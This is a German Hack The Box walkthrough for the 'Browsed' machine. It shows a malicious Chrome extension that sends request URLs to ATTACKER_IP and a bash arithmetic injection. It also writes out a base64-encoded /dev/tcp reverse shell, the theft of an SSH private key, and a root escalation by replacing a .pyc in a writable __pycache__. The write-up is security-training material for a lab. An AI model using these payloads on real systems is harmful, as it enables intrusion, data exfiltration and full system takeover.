# Hack The Box - Browsed (Deutsches Walkthrough)

## Synopsis

Browsed ist eine Medium-Linux-Maschine mit Fokus auf Client-Side Attacks über Browser-Erweiterungen, localhost Pivoting und Privilege Escalation über manipulierbare Python-Bytecode-Dateien.

Initial wird das Verhalten eines Entwickler-Portals missbraucht, das hochgeladene Chrome-Extensions testet. Eine bösartige Extension dient zunächst zur Überwachung interner Requests und offenbart einen internen Gitea-Host. Über Source-Code-Analyse wird anschließend eine Command Injection in einem localhost-only Flask-Endpunkt identifiziert und mit einer zweiten Extension ausgenutzt, um eine Reverse Shell als `larry` zu erhalten.

Für Privilege Escalation wird unsichere Handhabung von Python-`__pycache__` missbraucht: Durch Austausch einer vertrauenswürdigen `.pyc`-Datei wird beim sudo-ausführbaren Python-Tool Code als Root ausgeführt.

## Enumeration

### Nmap

```text
ports=$(nmap -p- --min-rate=1000 -T4 10.129.244.79 | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$//')
nmap -p$ports -sC -sV 10.129.244.79
```

**Offene Ports:**
- 22/tcp SSH
- 80/tcp HTTP (nginx)

**Hosts:**
```text
echo '10.129.244.79 browsed.htb' | sudo tee -a /etc/hosts
```

## Web Enumeration

Das Webportal erlaubt den Upload eigener Chrome-Extensions und erwähnt, dass Entwickler diese testen.

**Wichtige Observation:**
- Chrome v134 → Manifest V3 nötig

Das ist der erste Angriffsvektor.

## Initial Access

### Bösartige Recon-Extension

**`manifest.json`:**
```json
{
  "manifest_version": 3,
  "name": "Parallel Request Sender",
  "permissions": [
    "declarativeNetRequest",
    "webRequest"
  ],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "background.js"
  }
}
```

**`background.js`:**
```javascript
chrome.webRequest.onBeforeRequest.addListener(
  function(details) {
    if (!details.url.includes("ATTACKER_IP")) {
      fetch("http://ATTACKER_IP:4444", {
        method: "POST",
        body: JSON.stringify({ originalUrl: details.url })
      })
    }
  },
  { urls: ["<all_urls>"] }
)
```

**Zip bauen:**
```text
zip addon.zip manifest.json background.js
```

**Listener:**
```text
node server.js
```

Nach Upload erscheinen Requests.

**Leak:**
- `browsedinternals.htb`

**Hosts ergänzen:**
```text
echo '10.129.244.79 browsedinternals.htb' | sudo tee -a /etc/hosts
```

### Gitea Source Review

**Public Repo:**
- `MarkdownPreview`

**Clonen:**
```text
git clone http://browsedinternals.htb/larry/markdownPreview.git
cd markdownPreview
```

**Interessanter Endpoint:**
```python
@app.route('/routines/<rid>')
def routines(rid):
    subprocess.run(["./routines.sh", rid])
```

**In `routines.sh`:**
```bash
if [[ "$1" -eq 0 ]]; then
```

Bash Arithmetic Injection möglich.

**PoC:**
```text
./routines.sh 'x[$(cat /etc/passwd > /proc/$$/fd/1)]'
```

Injection bestätigt.

### Zweite Extension für RCE

**Payload base64:**
```text
echo -n "bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1" | base64
```

**Neue `background.js`:**
```javascript
function onExtensionLoaded() {
  fetch('http://127.0.0.1:5000/routines/x[$(echo BASE64PAYLOAD | base64 -d | bash)]');
}

onExtensionLoaded();
```

**Zip:**
```text
zip pwn.zip manifest.json background.js
```

**Listener:**
```text
nc -nvlp 9001
```

Upload triggern.

**Shell:**
- `larry@browsed`

## SSH Stabilisieren

**Key kopieren:**
```text
cat ~/.ssh/id_ed25519
```

**Permissions:**
```text
chmod 600 id_larry.rsa
```

**SSH:**
```text
ssh -i id_larry.rsa larry@10.129.244.79
```

**User Flag:**
```text
cat /home/larry/user.txt
```

## Privilege Escalation

### Sudo Enumeration

```text
sudo -l
```

**Interessant:**
```text
(root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

**Pfad prüfen:**
```text
ls -la /opt/extensiontool
```

**Auffällig:**
- `__pycache__` world writable
- `.pyc` hijacking

**Import im Tool:**
```python
from extension_utils import validate_manifest, clean_temp_files
```

**Legitime `.pyc` erzeugen:**
```text
sudo /opt/extensiontool/extension_tool.py
```

**Cache:**
- `extension_utils.cpython-312.pyc`

**Bösartiges Modul:**
```python
def validate_manifest(path):
    import os
    os.system('/bin/bash')

def clean_temp_files(path):
    import os
    os.system('/bin/bash')
```

**Kompilieren:**
```text
python3 -m py_compile /tmp/evil_module.py
```

Python nutzt einen 16-Byte-Header. Dieser wird transplantiert, damit die manipulierte `.pyc` akzeptiert wird.

**Exploit-Idee:**
```python
def transplant_header(good_pyc, evil_pyc, output_pyc):
    with open(good_pyc, 'rb') as f:
        header = f.read(16)
    with open(evil_pyc, 'rb') as f:
        data = f.read()
    new_pyc = header + data[16:]
    with open(output_pyc, 'wb') as f:
        f.write(new_pyc)
```

**Ausführen:**
```text
python3 create_header.py
```

Original `.pyc` ersetzen und Trigger ausführen:

```text
sudo /opt/extensiontool/extension_tool.py --ext Fontify
```

**Root Shell:**
```text
uid=0(root)
cat /root/root.txt
```

## Angriffskette Kurzüberblick

- Malicious Chrome Extension
- Internal Host Discovery
- Gitea Source Review
- Bash Arithmetic Injection
- Localhost Pivot via Second Extension
- Reverse Shell als `larry`
- Writable `__pycache__` Abuse
- Malicious `.pyc` Replacement
- Python Import Hijack
- Root
